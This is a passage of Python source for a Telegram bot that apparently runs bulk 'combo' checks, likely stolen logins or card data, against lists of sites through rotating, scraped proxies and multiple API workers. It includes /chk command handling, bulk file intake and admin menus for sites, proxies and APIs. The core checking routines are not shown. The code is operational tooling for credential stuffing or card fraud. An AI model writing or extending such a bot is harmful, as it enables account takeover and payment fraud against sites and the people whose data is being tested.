        bot.edit_message_text(f"🌐 **Proxy Manager**\nSaved Proxies: `{len(PROXIES)}`",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=proxy_menu(), parse_mode='Markdown')
    elif data == "proxy_upload":
        user_states[uid] = "awaiting_proxy_file"
        bot.edit_message_text("📤 **Send `.txt` file**", call.message.chat.id, call.message.message_id,
                              reply_markup=types.InlineKeyboardMarkup().add(
                                  types.InlineKeyboardButton("❌ Cancel", callback_data="menu_proxy")))
    elif data == "proxy_clear":
        PROXIES = []; save_json(PROXY_FILE, PROXIES)
        bot.answer_callback_query(call.id, "✅ Proxies Cleared!")
        bot.edit_message_text("🌐 **Proxy Manager**\nSaved Proxies: `0`",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=proxy_menu(), parse_mode='Markdown')
    elif data == "proxy_check":
        if not PROXIES:
            bot.answer_callback_query(call.id, "❌ No proxies.")
            return
        bot.answer_callback_query(call.id, "🔍 Checking…")
        threading.Thread(target=proxy_check_thread, args=(call.message, list(PROXIES)), daemon=True).start()
    elif data == "proxy_scrape":
        bot.answer_callback_query(call.id, "🕷️ Scraping…")
        threading.Thread(target=scrape_proxies_thread, args=(call.message,), daemon=True).start()

    # ===== APIs =====
    elif data == "menu_api":
        bot.edit_message_text(f"⚙️ **API Manager**\nActive APIs: `{len(API_BASES)}`",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=api_menu(), parse_mode='Markdown')
    elif data == "api_add":
        user_states[uid] = "awaiting_api"
        bot.edit_message_text("➕ **Send API URL**", call.message.chat.id, call.message.message_id,
                              reply_markup=types.InlineKeyboardMarkup().add(
                                  types.InlineKeyboardButton("❌ Cancel", callback_data="menu_api")))
    elif data == "api_list":
        text = "📜 **Saved APIs:**\n\n" + "\n".join([f"{i+1}. `{a}`" for i, a in enumerate(API_BASES)]) if API_BASES else "❌ No APIs saved."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=api_menu(), parse_mode='Markdown')

    # ===== STATS =====
    elif data == "menu_stats":
        bot.edit_message_text(
            f"📊 **Stats**\n\n⚙️ APIs: `{len(API_BASES)}`\n🌐 Proxies: `{len(PROXIES)}`\n"
            f"🏪 Sites: `{len(SITES)}`\n👥 Users: `{len(USERS)}`",
            call.message.chat.id, call.message.message_id,
            reply_markup=main_menu(), parse_mode='Markdown')

    # ===== BULK START =====
    elif data.startswith("start_np_") or data.startswith("start_p_"):
        is_proxy = data.startswith("start_p_")
        msg_id = int(data.replace("start_np_", "").replace("start_p_", ""))
        file_id = pending_files.get(msg_id)
        if not file_id:
            bot.answer_callback_query(call.id, "❌ Session expired.")
            return
        mode = "With Proxy" if is_proxy else "No Proxy"
        bot.answer_callback_query(call.id, f"🚀 Starting {mode}...")
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
        threading.Thread(target=start_bulk_by_id, args=(call.message, file_id, is_proxy), daemon=True).start()

# ==================== FILE HANDLER ====================
def process_bulk_file(doc_message, reply_msg=None):
    doc = doc_message.document
    if doc.file_size > 20 * 1024 * 1024:
        bot.reply_to(reply_msg or doc_message, "❌ File too large (Max 20MB).")
        return
    pending_files[doc_message.message_id] = doc.file_id
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start No Proxy", callback_data=f"start_np_{doc_message.message_id}"),
        types.InlineKeyboardButton("🌐 Start With Proxy", callback_data=f"start_p_{doc_message.message_id}")
    )
    bot.reply_to(reply_msg or doc_message, "📁 **File Detected!**\nChoose how to check:",
                 reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(content_types=['document'])
def handle_document(message):
    uid = message.from_user.id
    track_user(uid)

    if message.caption and message.caption.startswith('/chk'):
        process_bulk_file(message)
        return

    # only admin can upload proxy/site lists
    if not is_admin(uid):
        return

    if user_states.get(uid) in ("awaiting_site_file", "awaiting_site"):
        user_states[uid] = None
        msg = bot.reply_to(message, "⏳ Parsing sites...")
        try:
            file_info = bot.get_file(message.document.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            lines = [line.strip().lower() for line in content.splitlines() if line.strip()]
            added = 0
            for s in lines:
                if s not in SITES: SITES.append(s); added += 1
            save_json(SITE_FILE, SITES)
            bot.edit_message_text(f"✅ Added `{added}` sites.\nTotal: `{len(SITES)}`",
                                  msg.chat.id, msg.message_id, reply_markup=site_menu(), parse_mode='Markdown')
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}", msg.chat.id, msg.message_id)
        return

    if user_states.get(uid) == "awaiting_proxy_file":
        user_states[uid] = None
        msg = bot.reply_to(message, "⏳ Parsing proxies...")
        try:
            file_info = bot.get_file(message.document.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            lines = [line.strip() for line in content.splitlines() if line.strip()]
            added = 0
            for p in lines:
                if p not in PROXIES: PROXIES.append(p); added += 1
            save_json(PROXY_FILE, PROXIES)
            bot.edit_message_text(f"✅ Added `{added}` proxies.\nTotal: `{len(PROXIES)}`",
                                  msg.chat.id, msg.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}", msg.chat.id, msg.message_id)
        return

@bot.message_handler(func=lambda msg: is_admin(msg.from_user.id) and user_states.get(msg.from_user.id) == "awaiting_site")
def handle_site_input(message):
    user_states[message.from_user.id] = None
    url = message.text.strip().lower()
    if url not in SITES:
        SITES.append(url); save_json(SITE_FILE, SITES)
        bot.reply_to(message, f"✅ Added `{url}`.", reply_markup=site_menu(), parse_mode='Markdown')

@bot.message_handler(func=lambda msg: is_admin(msg.from_user.id) and user_states.get(msg.from_user.id) == "awaiting_api")
def handle_api_input(message):
    user_states[message.from_user.id] = None
    url = message.text.strip()
    if not url.startswith("http"): url = "https://" + url
    if url not in API_BASES:
        API_BASES.append(url); API_BASES = list(dict.fromkeys(API_BASES))
        save_json(API_FILE, API_BASES)
        bot.reply_to(message, "✅ API Added!", reply_markup=api_menu(), parse_mode='Markdown')

# ==================== CHECK COMMANDS ====================
@bot.message_handler(commands=['chk'])
def handle_chk(message):
    track_user(message.from_user.id)
    if not API_BASES:
        bot.reply_to(message, "❌ No APIs configured.")
        return
    if message.reply_to_message and message.reply_to_message.document:
        process_bulk_file(message.reply_to_message, reply_msg=message)
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2: return
    combos = parse_combos(parts[1])
    if not combos: return
    threading.Thread(target=single_check_thread, args=(message, combos[0]), daemon=True).start()

def start_bulk_by_id(msg, file_id, use_proxy):
    try:
        file_info = bot.get_file(file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        combos = parse_combos(content)
        if not combos:
            bot.edit_message_text("❌ No valid combos found.", chat_id=msg.chat.id, message_id=msg.message_id)
            return
        mode_str = "With Proxy" if use_proxy else "No Proxy"
        bot.edit_message_text(f"🚀 Checking **{len(combos):,}** combos using **{len(API_BASES)}** workers ({mode_str})...",
                              chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
        process_bulk_thread(msg, combos, use_proxy)
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {e}", chat_id=msg.chat.id, message_id=msg.message_id)

if __name__ == "__main__":
    print("Starting Bot...")
    bot.infinity_polling()